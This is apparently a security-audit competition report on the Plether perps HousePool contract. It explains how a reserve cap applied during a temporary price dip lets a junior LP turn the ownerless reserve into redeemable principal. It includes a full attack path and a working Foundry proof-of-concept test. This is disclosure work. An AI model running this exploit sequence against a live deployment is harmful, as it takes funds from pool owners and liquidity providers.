# \#100029 [SC-Medium] An LP epoch settled during a temporary drawdown permanently shrinks the ownerless reserve, and the recovery is redeemed by Junior LPs

**Submitted on Nov 16th 2026 at 05:20:51 UTC by @Norah for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100029
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary

`planReconcile` caps the stored unassigned reserve to the *current* distributable at every fresh reconcile (`HousePoolReconcilePlanLib.sol:73-74`). Distributable is a mark-to-market number: an unrealized trader gain against the pool depresses it. If an LP epoch settles during such a dip, the ownerless reserve is written down to the dipped value and `HousePool._reconcile` persists the reduction with no memory of the pre-dip balance (`HousePool.sol:1585`). Nothing anywhere restores it. When the mark returns, the planner subtracts only the reduced unassigned balance from distributable (`HousePoolReconcilePlanLib.sol:84-86`), so the written-down value flows through the waterfall into tranche principal, where LPs redeem it in cash. The documented route for ownerless value to reach a tranche is the owner-only `assignUnassignedAssets` with a matching share mint (`HousePool.sol:660-703`); the reconcile cap is a second, permissionless route that mints nothing and asks no one.

A junior LP who also holds the short that manufactures the dip captures the difference end to end: open the short, let the mark rise, settle an LP epoch inside the trough (permissionless through the router), let the mark return, close the short, and redeem. In the executed PoC the owner's 200,000 USDG recapitalization sits as the unassigned reserve; one trough settlement writes it down by 2,838.80 USDG; after the mark returns, the attacker's junior redemption pays 3,868.38 USDG against 1,032.42 in a same-snapshot control that skipped the trough settlement, with pool cash and trader balances identical between branches before the final redemption.

## The bug

1. The cap: `HousePoolReconcilePlanLib.sol:73-74` — `unassignedAssets = min(unassignedAssets, distributable)` at every fresh reconcile, where distributable embeds the current mark-to-market delta.
2. The persistence: `HousePool.sol:1584-1585` stores the planned state including the reduced reserve. No field records the pre-dip balance, and no path restores it; the only writers that ever increase `unassignedAssets` are the owner's assignment routing, the `juniorRevenueWithoutOwners` claw-back, and pending-application remainders.
3. The recovery routing: `HousePoolReconcilePlanLib.sol:84-90` subtracts the reduced reserve from the recovered distributable and hands the remainder to the waterfall, which restores senior to its high-water mark first and credits everything beyond it to junior principal — redeemable cash for LPs.
4. The permissionless trigger: with open positions, anyone settles an LP epoch through the router with a fresh mark; the matured redemption the attacker places in the trough epoch provides the settlement progress, and because the cap consumes the distributable first, the waterfall reprices junior to zero, so the attacker's request is zero-quote refunded and can be re-armed for the recovery epoch.

## Attack path

Pool seeded with one-atom tranche seeds; the attacker deposits 1,000 USDG as a junior LP (entry is still open; deposits are gated once unassigned exists). An honest junior deposits and exits 999.99 at the healthy mark. The owner recapitalizes 200,000 USDG; senior is at its high-water mark, so the entire amount becomes unassigned at the settle that the honest LP's exit triggers (200,000.000000 measured). The attacker opens an 80,000-token short at 1.00 with 5,000 margin.

1. The attacker requests a full junior redemption, and the mark rises to 1.05. The short's unrealized gain depresses distributable; the attacker settles the epoch inside the trough. The reconcile caps unassigned to 197,161.202404, junior reprices to zero, and the request is refunded.
2. The mark returns to 1.00 and the attacker closes the short flat. Pool cash and the trader's balances are identical to the control branch at this point.
3. The attacker claims the refunded shares (the claim restarts the one-hour request cooldown), re-requests, and the next settle funds the redemption out of the recovered principal: 3,868.376956 USDG.

Control from the same snapshot: identical marks, identical close, but no settlement inside the trough. Unassigned stays 200,000.000000, junior keeps its ordinary principal, and the same redemption pays 1,032.415415. The trough settlement alone moved 2,835.96 USDG of ownerless reserve into the attacker's wallet.

The dip is self-manufactured: the attacker's own short is the adverse mark exposure. The take scales with the reserve size and the depth of the excursion (the write-down equals the dip below the reserve), and the whole sequence needs no privileged role, no price manipulation beyond a real market move against an open short, and capital already committed as the junior deposit and the short margin.

## Impact

- Ownerless pool value — in practice the owner's recapitalization overshoot or revenue accrued with no tranche owners — is converted into redeemable tranche principal by an unprivileged LP, bypassing the owner-only assignment route and minting no shares.
- The conversion is permanent: after recovery the reserve stays at its reduced balance forever, so the value is not merely borrowed.
- Every honest LP epoch settlement during any adverse excursion does the same write-down with no attacker required; the attacker's contribution is timing the trough and holding the junior position that captures the return.
- The preconditions bound real-world frequency: a large unassigned balance exists only after owner recapitalization overshoot or a zero-owner revenue state, and the excursion must dip distributable below the reserve while an epoch settles inside the window.


## Recommendation

Do not truncate the unassigned reserve on mark-to-market dips. Either cap it only by distributable computed with the reserve excluded, or record the pre-dip balance and restore it when distributable recovers, so the write-down becomes a booking of the dip rather than a permanent transfer. Until then, `assignUnassignedAssets` remains the only route by which ownerless value should reach a tranche

## Proof of Concept

The PoC is a single Foundry test on the repository's own fixtures. It seeds one-atom tranches, deposits the attacker as a junior LP before the recapitalization, lands the owner's 200,000 USDG recap as the unassigned reserve through a real `recapitalizePool` call and an honest LP's exit settle, opens the short that manufactures the trough, then runs two branches from one snapshot: the attack (epoch settled inside the 1.05 trough, refund claimed, re-requested, redeemed at 1.00) and the control (same marks and close, no trough settlement). It asserts the payout difference and the permanent reduction of the reserve. No file under `src/` is modified, and there is no fuzzing.

To reproduce:

```bash
# 1. Frozen checkout (Foundry Forge 1.5.1, Solidity 0.8.35, via-IR)
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8

# 2. Save the source at the end of this report as packages/perps/test/poc/Med04_ReversibleMarkUnassigned.t.sol

# 3. Run it
forge test --root packages/perps --match-path 'test/poc/Med04_ReversibleMarkUnassigned.t.sol' -vv
```

The first compile covers the whole perps package under via-IR and takes several minutes. To compile only the PoC directory instead, prefix the same command with `FOUNDRY_TEST=test/poc` and add `--skip script`, which is how the numbers below were produced.

Expected output, passing:

```

[PASS] test_PLETHER_Med04_TroughSettlementConvertsUnassignedIntoJuniorPrincipal()
  honest LP exit (pre-attack): 999.999991
  unassigned after recap  : 200000.000000
  unassigned after trough: 197161.202404
  junior after trough     : 0.000000
  attack: LP payout       : 3868.376956
  attack: unassigned after: 197161.202404
  control: LP payout      : 1032.415415
  control: unassigned after: 200000.000000
```

Reading the output: the owner's recapitalization lands intact as the unassigned reserve (200,000.000000). One epoch settlement inside the 1.05 trough, where the attacker's own short is the adverse exposure, writes the reserve down to 197,161.202404 and reprices junior to zero. After the mark returns to 1.00 and the short closes flat, the attacker redeems 3,868.376956 USDG while the identical control without the trough settlement redeems 1,032.415415 and keeps the reserve at 200,000.000000. The 2,835.96 USDG difference is ownerless value the trough settlement converted into the attacker's cash, and the reserve never recovers it.

### PoC source (`packages/perps/test/poc/Med04_ReversibleMarkUnassigned.t.sol`)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Med 04: planReconcile caps unassignedAssets to the CURRENT distributable at
///         every fresh reconcile. If an LP epoch settles during a temporary adverse mark,
///         the ownerless reserve is written down to the dipped distributable and the
///         reduction is persisted with no memory. When the mark returns, the planner
///         subtracts only the reduced unassigned balance, so the written-down value flows
///         through the waterfall into tranche principal, where LPs can redeem it - no
///         owner assignment and no share mint. A junior LP who also holds the short that
///         manufactures the trough captures the difference: settle during the dip, let
///         the mark return, close, and redeem across the following epochs.
contract PocMed04ReversibleMarkUnassignedTest is BasePerpTest {
    address internal constant ATTACKER_LP = address(0xA77A);
    address internal constant ATTACKER_TR = address(0x5B0B7);
    address internal constant HONEST_LP = address(0x91C7);

    uint256 internal constant P0 = 1.00e8;
    uint256 internal constant P1 = 1.05e8; // the short gains about 4,000 on 80k tokens
    uint256 internal constant SHORT_SIZE = 80_000e18;
    uint256 internal constant RECAP = 200_000e6;
    uint256 internal constant DEPOSIT = 1_000e6;

    // Release parameters.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // One-atom seeds so the attacker owns essentially all junior shares.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000;
    }

    function test_PLETHER_Med04_TroughSettlementConvertsUnassignedIntoJuniorPrincipal() public {
        vm.warp(vm.getBlockTimestamp() + 1);
        _mark(P0);

        // Both LPs deposit before the recapitalization, while entry is still open.
        _fundJunior(ATTACKER_LP, DEPOSIT);
        _fundJunior(HONEST_LP, DEPOSIT);

        // Owner recapitalizes; senior is at its high-water mark, so the whole amount
        // becomes unassigned at the next reconcile, which the honest LP's maturing
        // redemption triggers.
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // clear the honest LP's deposit cooldown
        uint256 honestReq = _requestJuniorRedeemAll(HONEST_LP);
        _warpToJuniorEpoch();
        _mark(P0);
        _settleLpEpochForTest();
        uint256 honestPayout = _claimJuniorRedeem(HONEST_LP, honestReq);
        emit log_named_decimal_uint("honest LP exit (pre-attack)", honestPayout, 6);
        emit log_named_decimal_uint("unassigned after recap  ", pool.unassignedAssets(), 6);
        assertApproxEqAbs(pool.unassignedAssets(), RECAP, 2_000e6, "recap must land as unassigned");

        // The attacker opens the short that will manufacture the trough.
        _fundTrader(ATTACKER_TR, 20_000e6);
        _open(ATTACKER_TR, CfdTypes.Side.SHORT, SHORT_SIZE, 5_000e6, P0);

        uint256 snap = vm.snapshotState();

        // ---- Attack: settle an LP epoch inside the trough ----
        uint256 req = _requestJuniorRedeemAll(ATTACKER_LP);
        _warpToJuniorEpoch();
        _mark(P1);
        _settleLpEpochForTest(); // reconcile caps unassigned; junior reprices to zero; request refunded
        emit log_named_decimal_uint("unassigned after trough", pool.unassignedAssets(), 6);
        emit log_named_decimal_uint("junior after trough     ", pool.juniorPrincipal(), 6);

        // The mark returns and the short is closed; the recovered value flows to the
        // waterfall because unassigned stays at its reduced balance. The refunded
        // shares are claimed, re-requested, and redeemed out of the recovered principal.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _mark(P0);
        _close(ATTACKER_TR, CfdTypes.Side.SHORT, SHORT_SIZE, P0);
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeemRefund(req, ATTACKER_LP, ATTACKER_LP);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // share delivery restarts the request cooldown
        uint256 req2 = _requestJuniorRedeemAll(ATTACKER_LP);
        _warpToJuniorEpoch();
        _mark(P0);
        _settleLpEpochForTest();
        uint256 attackPayout = _claimJuniorRedeem(ATTACKER_LP, req2);
        uint256 attackUnassigned = pool.unassignedAssets();
        emit log_named_decimal_uint("attack: LP payout       ", attackPayout, 6);
        emit log_named_decimal_uint("attack: unassigned after", attackUnassigned, 6);

        // ---- Control: same marks and same close, no settlement inside the trough ----
        vm.revertToState(snap);
        uint256 cReq = _requestJuniorRedeemAll(ATTACKER_LP);
        vm.warp(vm.getBlockTimestamp() + 2 hours + 2);
        _mark(P1);
        vm.warp(vm.getBlockTimestamp() + 2);
        _mark(P0);
        _close(ATTACKER_TR, CfdTypes.Side.SHORT, SHORT_SIZE, P0);
        _warpToJuniorEpoch();
        _mark(P0);
        _settleLpEpochForTest();
        uint256 controlPayout = _claimJuniorRedeem(ATTACKER_LP, cReq);
        uint256 controlUnassigned = pool.unassignedAssets();
        emit log_named_decimal_uint("control: LP payout      ", controlPayout, 6);
        emit log_named_decimal_uint("control: unassigned after", controlUnassigned, 6);

        // The trough settlement alone moves thousands of ownerless USDG into the
        // attacker's redemption and permanently shrinks the unassigned reserve.
        assertGt(attackPayout, controlPayout + 2_000e6, "attacker must capture the written-down value");
        assertGt(controlUnassigned, attackUnassigned + 2_000e6, "write-down must persist after recovery");
    }

    function _mark(uint256 price) private {
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

    function _requestJuniorRedeemAll(address lp) private returns (uint256 requestId) {
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        vm.prank(lp);
        requestId = juniorVault.requestRedeem(shares, lp, lp);
    }

    function _warpToJuniorEpoch() private {
        (uint256 epoch,) = juniorVault.getRequestEpochWindow();
        uint256 target = pool.lpEpochStart(epoch) + 1;
        if (target <= vm.getBlockTimestamp()) {
            target = vm.getBlockTimestamp() + 1 hours + 1;
        }
        vm.warp(target);
    }

    function _claimJuniorRedeem(address lp, uint256 requestId) private returns (uint256 usdg) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        uint256 before = settlementToken.balanceOf(lp);
        if (claimable > 0) {
            vm.prank(lp);
            juniorVault.claimRedeem(requestId, claimable, lp, lp);
        }
        usdg = settlementToken.balanceOf(lp) - before;
    }
}
```
